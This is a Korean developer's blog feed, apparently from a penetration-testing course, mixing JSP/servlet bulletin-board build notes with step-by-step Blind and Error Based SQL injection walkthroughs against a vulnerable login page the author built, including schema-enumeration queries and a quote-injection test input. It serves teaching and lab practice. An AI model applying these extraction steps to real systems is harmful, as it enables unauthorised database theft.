<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-04T11:33:34+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.mingyu2.login</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Logout</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nd">@Override</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 로그아웃 요청이 아니면 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"/user-logout"</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">super</span><span class="o">.</span><span class="na">doGet</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">session</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">session</span><span class="o">.</span><span class="na">invalidate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"/sign_in_page"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<blockquote>
  <p>test</p>
</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">메뉴 버튼 및 게시판 제작</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/" rel="alternate" type="text/html" title="메뉴 버튼 및 게시판 제작" /><published>2023-05-04T00:00:00+09:00</published><updated>2023-05-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/"><![CDATA[<h2 id="jsp-페이지-모듈화">JSP 페이지 모듈화</h2>
<ul>
  <li>액션 태그를 사용해서 화면을 모듈화시켜 코드가 중복되는 것을 방지 할 수 있다.</li>
</ul>

<h3 id="-액션-태그-사용법"><jsp:include> 액션 태그 사용법</jsp:include></h3>
<ul>
  <li>
    <p>사용법
<script src="https://gist.github.com/MinGyu2/049ae15892e904872ad0834e58949544.js"></script></p>
  </li>
  <li>
    <p>태크 속성 설명</p>
    <ul>
      <li>page : 포함할 JSP 페이지</li>
      <li>flush : true 로 설정하면 현재 페이지가 지금까지 버퍼에 저장한 내용을 웹 브라우저로 전송하게 된다.  일단 헤더 정보가 웹 브라우저에 전송이 되고 나면 헤더 정보를 추가해도 결과가 반영되지 않는다. 따라서 일반적으로는 ‘false’로 지정한다.</li>
    </ul>
  </li>
</ul>

<h3 id="-액션-태그-처리-과정"><jsp:include> 액션 태그 처리 과정</jsp:include></h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4gbWFpbi5qc3AgOiDsmpTssq1cbm1haW4uanNwIC0-PiBtYWluLmpzcCA6IOy2nOugpSDrgrTsmqkxXG5tYWluLmpzcCAtPj4gc3ViLmpzcCA6IOyalOyyrVxuc3ViLmpzcCAtPj4gbWFpbi5qc3AgOiDstpzroKUg64K07JqpIHN1YlxubWFpbi5qc3AgLT4-IG1haW4uanNwIDog7Lac66ClIOuCtOyaqTJcbm1haW4uanNwIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOy2nOugpSDrsoTtjbwg64K07JqpIOyghOuLrCIsIm1lcm1haWQiOm51bGx9" /></p>

<h3 id="활용">활용</h3>
<ul>
  <li>
    <jsp:include> 액션 태그를 만들고 있는 서버에 적용시켰다.
</jsp:include>
  </li>
  <li>모듈화가 가능하여 코드가 좀 더 깔끔해졌다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236090570-d82e92f3-80ab-443c-b49e-51d778305b87.png" alt="Pasted image 20230503235614" /></p>

<h3 id="jsp">JSP</h3>
<ul>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/9303d6fa76e692d462a8e14cc207c5aa.js"></script></li>
  <li>home.jsp
<script src="https://gist.github.com/MinGyu2/772a5f530bbe6aeea2276afddb4a4b90.js"></script></li>
</ul>

<h2 id="메뉴-버튼">메뉴 버튼</h2>
<ul>
  <li>메인 페이지에 홈 버튼과 게시판 버튼을 만들었다.<br /><img src="https://user-images.githubusercontent.com/31990118/236091135-887cf47e-a593-4a8e-b36e-23d851d3805b.png" alt="Pasted image 20230503231355" /></li>
  <li>Home 버튼을 누르면 로그인하고 접속 하였을 때 가장처음 화면에 나타나는 페이지이다.</li>
  <li>게시판 버튼을 누르면 서버에 저장된 게시글들을 확인해 볼 수 있다.</li>
</ul>

<h3 id="jsp-1">JSP</h3>
<ul>
  <li>servlet 부터 메뉴 리스트를 받아와 사용하였다.</li>
  <li>다음 코드는 메뉴창을 나타내는 부분이다.</li>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/218ef37523342f45dfa8ac7676c54ce3.js"></script></li>
</ul>

<h3 id="servlet-java-코드">Servlet (Java 코드)</h3>
<ul>
  <li>메뉴 servlet 코드에서 메뉴 리스트를 만든 다음 메인 jsp 페이지로 포워딩 해준다.</li>
  <li>메인 jsp 페이지 파일에서 메뉴 리스트를 받아 html 파일을 완성 시키고 유저에게 페이지를 보여준다.</li>
  <li>MainPage.java
<script src="https://gist.github.com/MinGyu2/60f564ef505632451acd34c7fbfc90a8.js"></script></li>
</ul>

<h2 id="게시판">게시판</h2>

<h3 id="게시판-리스트-확인">게시판 리스트 확인</h3>
<ul>
  <li>게시판 버튼을 누르면 서버에 저장된 모든 글들을 볼 수 있다.</li>
  <li>글을 작성한 사람 이름, 글 제목 그리고 글 요약을 살펴볼 수 있다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236091519-177d6bf1-2f52-4705-80db-174d6430dee8.png" alt="Pasted image 20230503235957" /></p>

<h4 id="jsp-2">JSP</h4>
<h5 id="main_pagejsp">main_page.jsp</h5>
<ul>
  <li>
    <jsp:include> 액션 태그를 이용하였다.

</jsp:include>
  </li>
</ul>
<script src="https://gist.github.com/MinGyu2/a7f9b3c687ae254e052484f934159038.js"></script>

<h5 id="notice_boardjsp">notice_board.jsp</h5>
<ul>
  <li>for을 이용하여 servlet 으로 부터 받은 게시판 목록들을 나열하였다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/2fe9c7d42b55a006bcfc6dc05c0d89fa.js"></script>

<h4 id="servlet">Servlet</h4>
<h5 id="mainpagejava">MainPage.java</h5>
<ul>
  <li>NoticeBoardDAO 클래스를 이용하여 게시판 목록들을 DB 에서 불러왔다. 그리고 배열에 저장해 주었다.</li>
  <li>setAttribute 를 이용하여 jsp 페이지로 배열을 전달해 주었다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/e335fc6b887792c12db6660d9a218de0.js"></script>

<p><br /><br /></p>

<h3 id="게시판-글-자세히-읽기">게시판 글 자세히 읽기</h3>
<ul>
  <li>게시판 리스트 중 하나를 클릭하여 들어가면 스스로 작성한 글이나, 다른 사용자가 작성한 글을 읽을 수 있다.</li>
  <li>자기 자신이 쓴 글에 들어가면 글 수정을 위한 버튼이 나타난다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236093552-1a3768f9-3b3e-4909-96dc-e60d1933a0bb.png" alt="Pasted image 20230504000326" />
<img src="https://user-images.githubusercontent.com/31990118/236093639-ba25e841-0276-42f5-8522-b2153563765c.png" alt="Pasted image 20230504000408" /></p>

<h4 id="jsp-3">JSP</h4>
<h5 id="notice_detailjsp">notice_detail.jsp</h5>
<ul>
  <li>
    <jsp:include> 액션태그를 사용하였다.

</jsp:include>
  </li>
</ul>
<script src="https://gist.github.com/MinGyu2/dc906936bba90e8490400a1920312804.js"></script>

<h5 id="noticejsp">notice.jsp</h5>
<ul>
  <li>servlet 클래스에서 게시물 정보를 넘겨준다.</li>
  <li>게시글 작성자와 현재 접속중인 유저가 동일하면 수정 버튼을 활성화 한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/020b226f69db9478f8f899cf96839770.js"></script>

<h4 id="servlet-1">Servlet</h4>
<h5 id="mainpagejava-1">MainPage.java</h5>
<ul>
  <li>Get 을 통해 게시글의 sid를 받는다. Get으로 받은 <code class="language-plaintext highlighter-rouge">detailid</code> 입력을 가져온다.</li>
  <li>setAttribute 를 통해 게시글 정보를 jsp 한테 넘겨준다.</li>
  <li>게시글 작성자와 현재 접속중인 유저가 동일하면 수정 버튼을 활성화 한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a1917d62bb85a89be487042c767cf58e.js"></script>

<p><br /><br /></p>

<h3 id="게시판-새로운-글-쓰기">게시판 새로운 글 쓰기</h3>
<ul>
  <li>게시판에서 글쓰기 버튼을 클릭 하면 글쓰기 페이지가 나온다.</li>
  <li>제목 또는 본문 둘중에 하나라도 빈칸이면 저장이 안된다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236095373-403e687b-f55c-4db5-a59a-f0abc3320fbb.png" alt="Pasted image 20230503231355" />
<img src="https://user-images.githubusercontent.com/31990118/236095408-bcc22308-3e11-4a65-ab53-f482d6c64925.png" alt="Pasted image 20230504003204" /></p>

<h4 id="jsp-4">JSP</h4>
<h5 id="notice_writejsp">notice_write.jsp</h5>
<ul>
  <li>제목과 글을 입력하고 저장 버튼을 눌러주면 POST 방식으로 제목과 글을 서버로 전송한다.</li>
  <li>취소 버튼을 누르면 이전 페이지 다시 되돌아 간다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a026cd33b55c1112bceff74b40c6ecb6.js"></script>

<h4 id="servlet-2">Servlet</h4>
<h5 id="mainpagejava-2">MainPage.java</h5>
<ul>
  <li>noticeBoardWrite uri 로 접속하면 글쓰기 jsp 페이지로 넘어간다.</li>
  <li>글쓰기 jsp 페이지로 noticeBoardSave uri를 넘겨준다.</li>
  <li>저장 버튼을 눌러 저장을 할 때는 오직 POST 전송일 때만 가능하다.</li>
  <li>서버는 제목과 글을 POST 파라미터로 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/879701715b88f54216b4aaa469b096a4.js"></script>

<p><br /><br /></p>

<h2 id="db">DB</h2>

<h3 id="게시판-사용자-생성">게시판 사용자 생성</h3>
<ul>
  <li>게시판 글을 저장하기 위한 사용자를 먼저 만들어 주었다.<br /><script src="https://gist.github.com/MinGyu2/55b19361307bf1b1de4d1cd0807c04e6.js"></script></li>
</ul>

<h3 id="게시판-테이블-생성">게시판 테이블 생성</h3>
<ul>
  <li>게시판 글을 저장하는 테이블을 만들어 주었다.<br /><script src="https://gist.github.com/MinGyu2/a1528a7022d98d4db54891421b5acdd6.js"></script></li>
</ul>

<h3 id="게시판-글-올릴-때-사용한-sql-문">게시판 글 올릴 때 사용한 SQL 문</h3>
<ul>
  <li>다음 sql 쿼리문을 이용하여 글을 저장하였다.<br /><script src="https://gist.github.com/MinGyu2/ce3e8b3d981950a7141949a12be9c2a3.js"></script></li>
</ul>

<h3 id="게시판-글-삭제">게시판 글 삭제</h3>
<ul>
  <li>키인 <code class="language-plaintext highlighter-rouge">sid</code> 를 기준으로 글을 삭제한다.<br /><script src="https://gist.github.com/MinGyu2/fce1909509ddeac56a6388150bc807ee.js"></script></li>
</ul>

<h4 id="글을-삭제할-때-조건">글을 삭제할 때 조건</h4>
<ul>
  <li>관리자는 모든 글을 삭제 가능하다.</li>
  <li>사용자는 자기 자신이 쓴 글만 삭제가 가능해야한다.</li>
</ul>

<h2 id="전체-코드">전체 코드</h2>
<ul>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/e72b96cfba044c98a0eae09899473d6c.js"></script></li>
</ul>

<h2 id="발생한-오류">발생한 오류</h2>
<h3 id="create-session-권한-오류">create session 권한 오류</h3>
<ul>
  <li>오류 내용<br /><script src="https://gist.github.com/MinGyu2/40bf1fba073564873745a6dc81d79744.js"></script></li>
  <li>해결법<br /><script src="https://gist.github.com/MinGyu2/bc97c6225891a1e111bf525a3260b546.js"></script></li>
</ul>

<h3 id="create-table-할-때-부적합한-식별자-오류">create table 할 때 부적합한 식별자 오류</h3>
<ul>
  <li>오류 내용<br /><script src="https://gist.github.com/MinGyu2/f672b13ed2b599dbe7ce42c6740a3d23.js"></script></li>
  <li>해결법<br /><script src="https://gist.github.com/MinGyu2/66fbc7cbd7a1ef5ea30fd8964a4bc23f.js"></script></li>
</ul>

<h3 id="테이블스페이스-오류">테이블스페이스 오류</h3>
<ul>
  <li>오류 내용
<script src="https://gist.github.com/MinGyu2/3a32023b66ca251333fabdc13e339532.js"></script></li>
  <li>해결법
<script src="https://gist.github.com/MinGyu2/d928036f484915143ef937e0ce36ed1c.js"></script></li>
</ul>

<h3 id="열을-사용할-수-없습니다">열을 사용할 수 없습니다.</h3>
<ul>
  <li>오류 내용
<script src="https://gist.github.com/MinGyu2/86f8126d9d8d4888fb9cdacf5467e9ce.js"></script></li>
  <li>해결법
<script src="https://gist.github.com/MinGyu2/a9ca4d9719b57d2401daee09dfa26ecf.js"></script></li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://all-record.tistory.com/106">JSP 페이지 모듈화 &lt;jsp:include&gt; 액션태그 (tistory.com)</a></li>
  <li><a href="https://ojji.wayful.com/2015/04/HTML-DIV-tag-Scroll-Bar-Display-Hidden-Set-Overflow-auto-hidden-scroll-white-space-nowrap-overflow-x-overflow-y.html">HTML DIV tag: 스크롤바 넣기와 제어하기 </a></li>
  <li><a href="https://ju-won.tistory.com/14">div 강제 줄바꿈 처리 (tistory.com)</a></li>
  <li><a href="https://dogsavestheworld.tistory.com/275">JSP 게시판 만들기 - (10) 글쓰기 기능 구현 (CREATE) (tistory.com)</a></li>
  <li><a href="https://velog.io/@leemember/CSS-textarea-%ED%81%AC%EA%B8%B0-%EA%B3%A0%EC%A0%95%ED%95%98%EA%B8%B0">textarea 크기 고정하기 (velog.io)</a></li>
  <li><a href="https://totoscoming-coding.tistory.com/36"> HTML 예제 - 게시판 글쓰기 창 :: 쩝쩝산중 코딩로그 (tistory.com)</a></li>
  <li><a href="https://gent.tistory.com/323">오라클 컬럼(Column) 추가, 삭제 방법 (컬럼 순서 변경) (tistory.com)</a></li>
  <li><a href="https://offbyone.tistory.com/316">오라클 에러 ORA-00984: 열을 사용할 수 없습니다 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="JSP" /><category term="SERVLET" /><category term="JAVA" /><summary type="html"><![CDATA[메뉴 버튼 및 게시판 제작 하기]]></summary></entry><entry><title type="html">Blind SQL Injection 과정</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/" rel="alternate" type="text/html" title="Blind SQL Injection 과정" /><published>2023-04-30T00:00:00+09:00</published><updated>2023-04-30T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/"><![CDATA[<h2 id="이전-포스팅">이전 포스팅</h2>
<p><a href="https://mingyu2.github.io/SQLi%EB%B0%A9%EB%B2%95/">Union SQLi 과 Error Based SQLi 과정 정리.</a></p>

<h2 id="mysql-사전-지식">MYSQL 사전 지식</h2>

<h3 id="db-명-출력하기">DB 명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="테이블명-출력하기">테이블명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'DB명'</span>
</code></pre></div></div>

<h3 id="컬럼명-출력하기">컬럼명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'테이블명'</span>
</code></pre></div></div>

<h2 id="blind-sqli">Blind SQLi</h2>
<ul>
  <li>참과 거짓 조건에 따른 응답을 이용하여 한글자씩 알아내어 데이터를 추출하는 공격이다.</li>
</ul>

<h3 id="조건">조건</h3>
<ul>
  <li>결과가 화면에 안나오는 곳에서 사용한다.</li>
  <li>참과 거짓 조건에 따라 응답이 다른 곳에서 이용가능하다.</li>
</ul>

<h3 id="필요-함수">필요 함수</h3>
<ul>
  <li>substring</li>
  <li>ascii</li>
</ul>

<h3 id="과정">과정</h3>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 예측하기.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">x</span> <span class="k">from</span> <span class="n">x</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'x'</span><span class="p">;</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Blind SQLi 을 사용하기 위하여 참/거짓 일때 응답 결과가 다른지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/f65663add3c2cf18dc2b4d996a442919.js"></script></p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">select</code> 문 사용 가능한지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/4fe0c4b88eaf431299f49c54cb89d8f1.js"></script></li>
  <li>공격 포맷 만들기.<br /><script src="https://gist.github.com/MinGyu2/b7db2b39edc6e326b2426cc6a34fdeb5.js"></script></li>
  <li>database 이름 추출하기. 한 문자씩 알아내어야 한다.<br /><script src="https://gist.github.com/MinGyu2/cd056483c528aad3bb968bf459155150.js"></script></li>
  <li>테이블 이름들 추출하기. <br /><script src="https://gist.github.com/MinGyu2/65ae660dd4ef296c1a50279c04dc8467.js"></script></li>
  <li>컬럼 명 추출 하기.<br /><script src="https://gist.github.com/MinGyu2/17bae3c8991982ee9e076df17b090fa7.js"></script></li>
  <li>정보 추출하기.<br /><script src="https://gist.github.com/MinGyu2/5b9e37325e12999931619d2a70f71dac.js"></script></li>
</ol>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="sql injection" /><category term="Mysql" /><category term="DB" /><summary type="html"><![CDATA[Blind SQL Injection 과정 정리.]]></summary></entry><entry><title type="html">Error Based SQL Injection 연습</title><link href="http://localhost:4000/ErrorBasedSQLi/" rel="alternate" type="text/html" title="Error Based SQL Injection 연습" /><published>2023-04-27T00:00:00+09:00</published><updated>2023-04-27T23:13:00+09:00</updated><id>http://localhost:4000/ErrorBasedSQLi</id><content type="html" xml:base="http://localhost:4000/ErrorBasedSQLi/"><![CDATA[<ul>
  <li>Error Based SQL Injection을 연습하기 위해 DB 에러를 보여주는 로그인 페이지를 만들었다.</li>
</ul>

<h3 id="조건">조건</h3>
<ul>
  <li>SQL 질의문 결과가 화면에 안보임. (로그인, 아이디 중복 체크)</li>
  <li>DB Error 메세지가 화면에 출력되어야 한다.</li>
</ul>

<h3 id="sqli-취약점-서버-환경">SQLi 취약점 서버 환경</h3>
<hr />
<ul>
  <li>웹서버 : 우분투 Ubuntu 22.04.2 LTS</li>
  <li>DB 서버 : Oracle DB oracle-database-xe-21c</li>
</ul>

<h3 id="과정">과정</h3>
<hr />
<ol>
  <li>서버에서 어떤 질의문을 사용하고 있는지 추측하기.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">xxx</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'x'</span> <span class="p">....</span>
</code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234779915-76b7335a-3e35-4f0f-97de-a902fe96ad7b.png" alt="Pasted image 20230427144207" /></p>
  </li>
  <li>의도적으로 오류 발생 시킨다음 오류 내용 확인 한다. SQL 오류가 출력되는 것을 확인할 수 있다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="n">x</span><span class="s1">'
</span></code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234780248-2ebfb6be-ab2c-4952-879c-72825539b485.png" alt="Pasted image 20230427144608" /></p>
  </li>
  <li>Error Based SQL Injection Function 동작하는지 확인하기. <code class="language-plaintext highlighter-rouge">test</code> 단어가 오류에 출력되는 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/293d020a722eab98690d36a3d0941b2d.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234782415-65e101a8-f895-4990-ab70-23b9ee55828e.png" alt="Pasted image 20230427145024" /></li>
  <li>사용자 이름 구하기. <code class="language-plaintext highlighter-rouge">C##DBFORPROB</code> 라는 것을 알 수 있다.<br /><script src="https://gist.github.com/MinGyu2/bece6ae6ed2f5d8876d443bb48e43594.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234782649-f607470f-6044-4410-b577-819ff2a794d8.png" alt="Pasted image 20230427145221" /></li>
  <li><strong>Table</strong> 이름 구하기. <code class="language-plaintext highlighter-rouge">MEMBERS</code> 테이블이 존재하는 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/e6bac283e7b366b8b86d8cb0aa8af81e.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234783063-ee4f03be-69e8-49f9-b0df-0d9949055a5e.png" alt="Pasted image 20230427150937" /></li>
  <li><strong>column</strong> 이름 구하기.<br /><script src="https://gist.github.com/MinGyu2/18aed7c05b1894da21c4f243ecf50fc7.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234784240-620cbc18-efed-4af0-baf2-f881f587d037.png" alt="Pasted image 20230427151541" /><br /><img src="https://user-images.githubusercontent.com/31990118/234784314-9d32b04c-8828-4ef2-b5cc-4f0924a2ff2a.png" alt="Pasted image 20230427151801" /></li>
  <li>데이터 추출하기.<br /><script src="https://gist.github.com/MinGyu2/9d815c9e7f74b80823ac81c15d60aec8.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234785665-fe1ac79a-2812-4c9f-a2b8-709ec4eac7d8.png" alt="Pasted image 20230427160531" /></li>
</ol>

<ul>
  <li>추출한 정보 확인<br /><img src="https://user-images.githubusercontent.com/31990118/234787698-dd12b6ff-d729-4617-9be5-95f2ef87e07a.png" alt="Pasted image 20230427152642" /><br /><img src="https://user-images.githubusercontent.com/31990118/234788225-fbe9d647-85ef-46c1-8d81-2535e4979f08.png" alt="Pasted image 20230427161753" /></li>
</ul>

<h3 id="참고사이트">참고사이트</h3>
<hr />
<ul>
  <li><a href="https://stackoverflow.com/questions/470542/how-do-i-limit-the-number-of-rows-returned-by-an-oracle-query-after-ordering">sql - How do I limit the number of rows returned by an Oracle query after ordering? - Stack Overflow</a></li>
  <li><a href="https://jwklife.tistory.com/45">오라클 테이블 &amp; 컬럼 조회 하는 방법 :: 인 생 (tistory.com)</a></li>
  <li><a href="https://mymuseum.tistory.com/9">Oracle DB (데이터 베이스) 정보 찾기 (tistory.com)</a></li>
